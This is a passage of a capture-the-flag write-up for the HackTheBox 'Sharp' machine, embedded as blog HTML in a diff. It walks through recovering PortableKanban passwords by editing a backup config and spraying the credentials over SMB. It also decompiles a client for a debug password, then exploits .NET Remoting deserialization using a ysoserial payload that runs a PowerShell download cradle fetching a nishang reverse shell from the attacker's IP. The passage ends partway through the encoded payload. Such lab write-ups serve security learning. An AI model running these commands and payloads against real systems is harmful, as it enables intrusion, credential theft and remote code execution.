class="string">&quot;TopicId&quot;</span>:<span class="string">&quot;00000000000000000000000000000000&quot;</span>,<span class="string">&quot;PersonId&quot;</span>:<span class="string">&quot;00000000000000000000000000000000&quot;</span>,<span class="string">&quot;Text&quot;</span>:<span class="string">&quot;New Task&quot;</span>,<span class="string">&quot;Priority&quot;</span>:<span class="string">&quot;Low&quot;</span>,<span class="string">&quot;Created&quot;</span>:<span class="string">&quot;\/Date(1605380100000+0100)\/&quot;</span>,<span class="string">&quot;CreatedBy&quot;</span>:<span class="string">&quot;e8e29158d70d44b1a1ba4949d52790a0&quot;</span>,<span class="string">&quot;Modified&quot;</span>:<span class="string">&quot;\/Date(-62135596800000)\/&quot;</span>,<span class="string">&quot;ModifiedBy&quot;</span>:<span class="string">&quot;00000000000000000000000000000000&quot;</span>,<span class="string">&quot;Deadline&quot;</span>:<span class="string">&quot;\/Date(1605308400000+0100)\/&quot;</span>,<span class="string">&quot;HasDeadline&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Completed&quot;</span>:<span class="string">&quot;\/Date(1605308400000+0100)\/&quot;</span>,<span class="string">&quot;CompletedBy&quot;</span>:<span class="string">&quot;00000000000000000000000000000000&quot;</span>,<span class="string">&quot;Done&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Canceled&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Link&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;Subtasks&quot;</span>:[],<span class="string">&quot;Tags&quot;</span>:[],<span class="string">&quot;Estimate&quot;</span>:0,<span class="string">&quot;Progress&quot;</span>:0,<span class="string">&quot;Points&quot;</span>:0,<span class="string">&quot;Comments&quot;</span>:[],<span class="string">&quot;CustomFields&quot;</span>:&#123;&#125;,<span class="string">&quot;TimeStamp&quot;</span>:637409769542424146&#125;],<span class="string">&quot;TimeTracks&quot;</span>:[],<span class="string">&quot;Persons&quot;</span>:[],<span class="string">&quot;Topics&quot;</span>:[],<span class="string">&quot;Tags&quot;</span>:[],<span class="string">&quot;Views&quot;</span>:[],<span class="string">&quot;Users&quot;</span>:[&#123;<span class="string">&quot;Id&quot;</span>:<span class="string">&quot;e8e29158d70d44b1a1ba4949d52790a0&quot;</span>,<span class="string">&quot;Name&quot;</span>:<span class="string">&quot;Administrator&quot;</span>,<span class="string">&quot;Initials&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;Email&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;EncryptedPassword&quot;</span>:<span class="string">&quot;k+iUoOvQYG98PuhhRC7/rg==&quot;</span>,<span class="string">&quot;Role&quot;</span>:<span class="string">&quot;Admin&quot;</span>,<span class="string">&quot;Inactive&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;TimeStamp&quot;</span>:637409769245503731&#125;,&#123;<span class="string">&quot;Id&quot;</span>:<span class="string">&quot;0628ae1de5234b81ae65c246dd2b4a21&quot;</span>,<span class="string">&quot;Name&quot;</span>:<span class="string">&quot;lars&quot;</span>,<span class="string">&quot;Initials&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;Email&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;EncryptedPassword&quot;</span>:<span class="string">&quot;Ua3LyPFM175GN8D3+tqwLA==&quot;</span>,<span class="string">&quot;Role&quot;</span>:<span class="string">&quot;User&quot;</span>,<span class="string">&quot;Inactive&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;TimeStamp&quot;</span>:637409769265925613&#125;],<span class="string">&quot;ServiceMessages&quot;</span>:[],<span class="string">&quot;CustomFieldDescriptors&quot;</span>:[],<span class="string">&quot;MetaData&quot;</span>:&#123;<span class="string">&quot;Id&quot;</span>:<span class="string">&quot;ffffffffffffffffffffffffffffffff&quot;</span>,<span class="string">&quot;SchemaVersion&quot;</span>:<span class="string">&quot;4.2.0.0&quot;</span>,<span class="string">&quot;SchemaVersionModified&quot;</span>:<span class="string">&quot;\/Date(1605380100000+0100)\/&quot;</span>,<span class="string">&quot;SchemaVersionModifiedBy&quot;</span>:<span class="string">&quot;e8e29158d70d44b1a1ba4949d52790a0&quot;</span>,<span class="string">&quot;SchemaVersionChecked&quot;</span>:<span class="string">&quot;\/Date(-62135596800000-0000)\/&quot;</span>,<span class="string">&quot;SchemaVersionCheckedBy&quot;</span>:<span class="string">&quot;00000000000000000000000000000000&quot;</span>,<span class="string">&quot;TimeStamp&quot;</span>:637409769001918463&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Think of ack like grep . As default, Ack trawls through files in our current working directory and searches for the string we want.</p>
+</li>
+<li><p>Sometimes, grep can be complicated to get right, and also isolates a string from its wider context, which can sometimes be misleading in my opinion</p>
+</li>
+</ul>
+<p>take a closer look at what we have here in PortableKanban.pk3, we have encrypted passwords and some usernames too, with their respective privileges.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">ID: e8e29158d70d44b1a1ba4949d52790a0</span><br><span class="line">Encrypted Password: <span class="string">&quot;k+iUoOvQYG98PuhhRC7/rg==&quot;</span></span><br><span class="line"></span><br><span class="line">Lars</span><br><span class="line">ID: 0628ae1de5234b81ae65c246dd2b4a21</span><br><span class="line">Encrypted Password: <span class="string">&quot;Ua3LyPFM175GN8D3+tqwLA==&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Read-the-Docs"><a href="#Read-the-Docs" class="headerlink" title="Read the Docs"></a>Read the Docs</h3><p>before trying to reverse engineer the .exe file to find out how the passwords are hashed, it’s best to read the user guide that accompanied these SMB files: firefox “User Guide.pdf”</p>
+<ul>
+<li>Some important notes I take from reading the docs:</li>
+</ul>
+<p>page 1: As the program is ‘portable’, it’s at our mercy if we change config files</p>
+<p>page 3: Blank passwords shouldn’t be used - which says to me, it CAN be used but isn’t advised</p>
+<p>pages 11: There is the only one default user: “Administrator” with blank password.</p>
+<p>page 18: suggests that if you forget your password, just take the portable .exe to a different directory and try to execute it as Admin?</p>
+<p>pp 22: “Passwords are hidden by default in Setup&#x2F;Users tab.”</p>
+<p>Reading the docs, it seems like need to relocate to a Windows VM, sign in as Administrator,and try and find the decrypted passwords that may be waiting in Users?</p>
+<p>zipped the entire directory that we downloaded from the SMB share, and moved it to my windows VM.</p>
+<h3 id="Sign-in-as-Admin"><a href="#Sign-in-as-Admin" class="headerlink" title="Sign in as Admin"></a>Sign in as Admin</h3><p>When start the .exe, this interesting pop up let’s know that data from a pk3.bak is recovered. Intresting</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb138.jpg"></li>
+</ul>
+<p>when try to sign in as Admin with a blank password, don’t sign in! So much for an easy ride.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb139.jpg"></li>
+</ul>
+<h3 id="Config-Manipulation"><a href="#Config-Manipulation" class="headerlink" title="Config Manipulation"></a>Config Manipulation</h3><p>return back to that first pop up: that the data was recovered from the pk3.bak file. When we open it, we can see it’s the same file we got the encrypted passwords from earlier</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb140.jpg"></li>
+</ul>
+<p>If the .exe calls on this backup file to restore it’s own configurations, we may be able to remove the existing password fields. It may possibly let us sign straight in - let’s try.</p>
+<p>What we need to do is remove this entire directory and the un-zip it fresh again. Now go and manipulate the pk3.bak file.</p>
+<p>If we open the pk3.bak file in notepad, and remove this value for the password so it shows we should gain access . Be sure to Save the file as “All Files”, and let it replace any file it wants.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb141.jpg"></li>
+</ul>
+<p>Now, if we run the .exe and let it call on the pk3 backup, it will load the “blank password” and let’s us sign in as Administrator</p>
+<h3 id="Password-Hunt"><a href="#Password-Hunt" class="headerlink" title="Password Hunt"></a>Password Hunt</h3><ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb142.jpg"></li>
+</ul>
+<p>From our notes earlier, we gathered that we need to find the Users tab, as this is where we might find a password. Click on the cog for setup. Then move to the Users tab</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb143.jpg"></li>
+</ul>
+<p>we get the password for Lars: G123HHrth234gRG</p>
+<h3 id="Make-Lars-Admin"><a href="#Make-Lars-Admin" class="headerlink" title="Make Lars Admin"></a>Make Lars Admin</h3><p>Before we go and take these creds back to the SMB share, to see if we have access to anything new, let’s experiment with making Lars admin.</p>
+<p>Delete the directory for the exe again. Unzip a fresh install, and edit the pk4.bak file again to change Lars to Admin</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb144.jpg"></li>
+</ul>
+<p>And what do you know, if we make Lars admin in the config file, sign in, and look at the passwords again, we get the Admin’s too: G2@$btRSHJYTarg (spolier: we don’t do much with the admin’s password)</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb145.jpg"></li>
+</ul>
+<h3 id="Test-the-Creds"><a href="#Test-the-Creds" class="headerlink" title="Test the Creds"></a>Test the Creds</h3><p>Armed with credentials, we can begin a second round of enumeration back in our Kali VM</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#users;passwords</span></span><br><span class="line">administrator : <span class="string">&quot;G123HHrth234gRG&quot;</span></span><br><span class="line">lars : <span class="string">&quot;G2@<span class="variable">$btRSHJYTarg</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>If we put these into a respective users and passwords list in kali, and then run crackmapexec we can see if we have any valid creds:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/sharp]</span><br><span class="line">└─<span class="comment"># crackmapexec smb 10.10.10.219 -u usernames.txt -p passwords.txt</span></span><br><span class="line">SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.219    445    SHARP            [-] Sharp\administrator:G123HHrth234gRG STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.219    445    SHARP            [-] Sharp\administrator:G2@<span class="variable">$btRSHJYTarg</span> STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.219    445    SHARP            [+] Sharp\lars:G123HHrth234gRG</span><br></pre></td></tr></table></figure>
+
+<p>Lars’ creds are valid on the SMB share, so let’s go and see if we have access to anything new.</p>
+<h3 id="SMB-enum-II"><a href="#SMB-enum-II" class="headerlink" title="SMB enum II"></a>SMB enum II</h3><p>Running smbmap again with valid creds shows us we have access to a dev share:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/sharp]</span><br><span class="line">└─<span class="comment"># smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219</span></span><br><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        dev                                                     READ ONLY</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        kanban                                                  NO ACCESS</span><br></pre></td></tr></table></figure>
+
+<p>Running the previous command with -R lists out what awaits us in the dev share. There isn’t too much here, so let’s download it and take a look:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/sharp]</span><br><span class="line">└─<span class="comment"># smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219 -R</span></span><br><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        dev                                                     READ ONLY</span><br><span class="line">        .\dev\*</span><br><span class="line">        dr--r--r--                0 Sun Nov 15 06:30:13 2020    .</span><br><span class="line">        dr--r--r--                0 Sun Nov 15 06:30:13 2020    ..</span><br><span class="line">        fr--r--r--             5632 Sun Nov 15 05:25:01 2020    Client.exe</span><br><span class="line">        fr--r--r--               70 Sun Nov 15 08:59:02 2020    notes.txt</span><br><span class="line">        fr--r--r--             4096 Sun Nov 15 05:25:01 2020    RemotingLibrary.dll</span><br><span class="line">        fr--r--r--             6144 Mon Nov 16 06:55:44 2020    Server.exe</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        .\IPC$\*</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-364-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1e4-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-190-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-428-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-254-0</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-274-0</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132546763363573536.2940.DefaultAppDomain.wsmprovhost</span><br><span class="line">        kanban                                                  NO ACCESS</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbget -R smb://10.10.10.219/dev/ -U lars%G123HHrth234gRG</span><br></pre></td></tr></table></figure>
+
+<p>Looks like we’re gonna zip this new downloaded dev directory and pop it over to our Windows VM again</p>
+<h3 id="De-compiling"><a href="#De-compiling" class="headerlink" title="De-compiling"></a>De-compiling</h3><p>To figure out what these binaries are doing, we need to recompile them. dnspy is one such tool for decompile .exes: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RuU3B5L2RuU3B5">https://github.com/dnSpy/dnSpy<i class="fa fa-external-link-alt"></i></span></p>
+<p>Once you have dnspy, open up client.exe and start opening up the tabs on the left</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb146.jpg"></li>
+</ul>
+<p>The tab we’re looking for is called remote sample, as this contains some interesting creds just hanging out</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb147.jpg"></li>
+</ul>
+<p>The key information is that we now have creds for the service on port 8888, which we found earlier in our nmap scan. We also have the directory&#x2F;API to call on when we make the request too (SecretSharpDebugApp……)</p>
+<ul>
+<li>debug : “SharpApplicationDebugUserPassword123!”</li>
+</ul>
+<h3 id="In-Search-of-an-Exploit"><a href="#In-Search-of-an-Exploit" class="headerlink" title="In Search of an Exploit"></a>In Search of an Exploit</h3><p>In this same dnspy tab, we can take the top string “Remoting.Channels.Tcp” and google it and ask for an exploit. The third option on google is a github with a possible exploit: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3R5cmFuaWQvRXhwbG9pdFJlbW90aW5nU2VydmljZQ==">https://github.com/tyranid/ExploitRemotingService<i class="fa fa-external-link-alt"></i></span></p>
+<ul>
+<li>An excellent pre-compiled can be found here: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcnRlZWtzaW5naDAwNS9FeHBsb2l0UmVtb3RpbmdTZXJ2aWNlX0NvbXBpbGVk">https://github.com/parteeksingh005/ExploitRemotingService_Compiled<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<h3 id="Compile-the-Exploit"><a href="#Compile-the-Exploit" class="headerlink" title="Compile the Exploit"></a>Compile the Exploit</h3><p>compile this github exploit in visual studio community.</p>
+<ul>
+<li>If it’s too difficult to make a working binary, I’d suggest you use the pre-compiled binary above</li>
+</ul>
+<p>Install the necessary libraries that visual studio asks for, and then traverse around the directories and files on the left until you find ExploitRemotingService.csproj.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb148.jpg"></li>
+</ul>
+<p>Click build and watch the output, which should tell you where the resultant client .exe is located.</p>
+<h3 id="Create-a-reverse-shell"><a href="#Create-a-reverse-shell" class="headerlink" title="Create a reverse shell"></a>Create a reverse shell</h3><p>We need to complete a number of steps here, which aren’t complicated but do need to be in a particular order:</p>
+<ol>
+<li><p>Download python for windows, and start a python web server: python -m SimpleHTTPServer 80</p>
+</li>
+<li><p>Download netcat for windows and listen on the port for a reverse shell: nc.exe -lvp 4321</p>
+</li>
+<li><p>Download a nishang reverse shell, save it, and add this one-liner at the end of the file to have the victim execute the reverse shell:<br>Invoke-PowerShellTcp -Reverse -IPAddress [Your IP] -Port [Your listner port]</p>
+</li>
+<li><p>Produce a serialised reverse shell by downloading Yososerial</p>
+</li>
+<li><p>Connect to the victim machine via the binary we compiled, with the attached the commands for a reverse shell.</p>
+</li>
+</ol>
+<p>The first two steps are easy, so let’s focus on the last two.</p>
+<h3 id="ysoserial-net"><a href="#ysoserial-net" class="headerlink" title="ysoserial.net"></a>ysoserial.net</h3><p>We can find Yososerial here: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B3bnRlc3Rlci95c29zZXJpYWwubmV0L3JlbGVhc2VzL2Rvd25sb2FkL3YxLjM0L3lzb3NlcmlhbC0xLjM0LnppcA==">https://github.com/pwntester/ysoserial.net/releases/download/v1.34/ysoserial-1.34.zip<i class="fa fa-external-link-alt"></i></span></p>
+<p>What we’re going to do here is produce a serialised command to reach into our web server and grab the reverse shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -f BinaryFormatter -o <span class="built_in">base64</span> -g TypeConfuseDelegate -c <span class="string">&quot;powershell -c IEX(new-object net.webclient).downloadstring(&#x27;http://10.10.14.5/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>and we got</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAGsvYyBwb3dlcnNoZWxsIC1jIElFWChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuNS9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL</span><br></pre></td></tr></table></figure>
+
+<p>We’re now going to take the long output and include it to the binary we built.</p>
+<h3 id="Remote-connection-exe"><a href="#Remote-connection-exe" class="headerlink" title="Remote connection .exe"></a>Remote connection .exe</h3><p>And now let’s run the binary with the serialised output:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExploitRemotingService.exe -s --user=debug --pass=<span class="string">&quot;SharpApplicationDebugUserPassword123!&quot;</span> tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAGsvYyBwb3dlcnNoZWxsIC1jIElFWChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3R